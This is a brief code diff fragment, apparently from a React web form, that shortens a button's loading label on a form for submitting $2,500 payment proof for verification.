-                {submittingDeposit ? 'Submitting Verification...' : 'Submit $2,500 Payment Proof for Verification'}
+                {submittingDeposit ? 'Submitting...' : 'Submit $2,500 Payment Proof for Verification'}
               </button>
             </form>
           </div>
